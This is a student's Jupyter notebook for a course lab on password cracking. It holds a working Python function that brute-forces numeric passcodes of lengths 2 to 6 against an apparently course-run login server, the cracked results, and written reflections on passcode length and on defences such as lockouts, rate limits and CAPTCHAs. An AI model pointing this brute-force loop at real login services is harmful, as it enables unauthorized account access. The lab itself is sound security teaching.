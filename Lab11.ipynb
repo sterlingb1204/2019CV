{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab 11: Password Cracking\n",
    "\n",
    "- **Name**:  Sterling Bhollah\n",
    "- **NetID**: sbhollah"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "import requests\n",
    "\n",
    "from ipywidgets      import IntProgress\n",
    "from IPython.display import display"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Constants"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "URL    = 'http://xavier.h4x0r.space:9999'\n",
    "NETID  = 'sbhollah' # TODO: Replace with your netid\n",
    "LENGTH = 4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def attack(url=URL, netid=NETID, length=LENGTH):\n",
    "    ''' Attempt to brute-force attack the passcode for the specified netid and specified passcode length '''\n",
    "    \n",
    "    progress = IntProgress(max=10**length)\n",
    "    display(progress)\n",
    "    startTime = time.time()\n",
    "    \n",
    "    combinations = (10**length)\n",
    "    passcode = 0\n",
    "    access = 0\n",
    "    \n",
    "    while passcode < combinations:\n",
    "        \n",
    "        # Pad passcode with 0's\n",
    "        passcode = str(passcode).zfill(length)\n",
    "        \n",
    "        #Attempt to login\n",
    "        params   = {'netid': netid, 'passcode': passcode}\n",
    "        response = requests.get(url, params=params)\n",
    "        \n",
    "        #Calculate the time it took to create one request\n",
    "        endTime = time.time()\n",
    "        elapsedTime = endTime - startTime\n",
    "        \n",
    "        # Update Integer Progress Bar\n",
    "        progress.value = passcode\n",
    "        progress.description = '{:0.2f} s'.format(elapsedTime)\n",
    "        \n",
    "        # Checks to see if access is granted\n",
    "        if \"Access Granted\" in response.text:\n",
    "            access = 1\n",
    "            key = passcode\n",
    "            break #exit while loop\n",
    "            \n",
    "        #iterates passcode by 1\n",
    "        passcode = int(passcode) + 1\n",
    "    \n",
    "    if access == 1:\n",
    "        print(\"Passcode for {} is: {}\".format(netid,key))\n",
    "    else:\n",
    "        print(\"No passcode found for {}\".format(netid))\n",
    "    \n",
    "    \n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacks\n",
    "\n",
    "Attempt passwords of length 2, 3, 4 (default), 5, and 6."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "80db505f99c94fde85ac27e7b7eca098",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntProgress(value=0, max=10000)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Passcode for sbhollah is: 3048\n"
     ]
    }
   ],
   "source": [
    "attack() # Default netid of length 4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "24ee470c42ea4dd98183a77281c3a003",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntProgress(value=0)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Passcode for sbhollah2 is: 45\n"
     ]
    }
   ],
   "source": [
    "attack(netid = NETID + \"2\", length=2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "838c84ba435c4e58a3c297afdbd9b3ed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntProgress(value=0, max=1000)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Passcode for sbhollah3 is: 532\n"
     ]
    }
   ],
   "source": [
    "attack(netid= NETID + \"3\", length=3) # Passcode of length 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f39e6be390764803bb6880022474af39",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntProgress(value=0, max=100000)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Passcode for sbhollah5 is: 78439\n"
     ]
    }
   ],
   "source": [
    "attack(netid= NETID + \"5\", length=5) # Passcode of length 5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1e32e18c52a44aee8932d3febd8febbc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntProgress(value=0, max=1000000)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Passcode for sbhollah6 is: 932615\n"
     ]
    }
   ],
   "source": [
    "attack(netid= NETID+\"6\", length=6) # Passcode of length 6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reflections\n",
    "\n",
    "1. Describe how your `attack` function works.  How did it generate the sequence of candidate passcodes and how did it check if the passcode succeeded?\n",
    "\n",
    "    <font color=\"red\">The attack function works by initiating a while loop that will iterate through every number between 0 and 10^length. The program will then fill the passcode with 0's if needed to make it into the correct length. The program will then use an if statement to search the response.text to determine if \"Access Granted\" is found in the output. If it is, the program will exit the while loop and print a statement to the user revealing the password that worked. However, if this if statement evaluates to false, the program will continue to iterate through the while loop until every possible combitation is checked. If the program goes through the whole while-loop and does not find a password that works, then it will print \"No passcode found\"</font>\n",
    "\n",
    "2. From this experience, what is the impact of passcode length on the security of a system?\n",
    "\n",
    "    <font color=\"red\">It is clear that passcode length has a strong correlation with time it takes to crack it using brute force. This is because an increase of the length of a numerical passcode by one more digit increases the time it takes to crack by a factor of 10. For example, a 3 digit password only has 1000 possible combinations, but a 4 digit passcode has 10,000 possible combinations. This means that the 4 digit code will require much more time. This trend applies for even longer passwords with 5 or 6 digits or even passwords that include letters or other special characters. </font>\n",
    "\n",
    "3. Besides modifying the characteristics of the passcode, what else could a website do to prevent brute-force attacks?\n",
    "\n",
    "    <font color=\"red\">A website could prevent the amount of times a user may enter an incorrect passcode and lock them put of the system after 5 or so incorrect tries. A website could also out a limit on how fast a user can type in different passcodes. A website could do this by creating a 15 second delay before a user can submit another request. Additionally a website could ad a re-captcha to prove that the user is human and not using brute force.</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
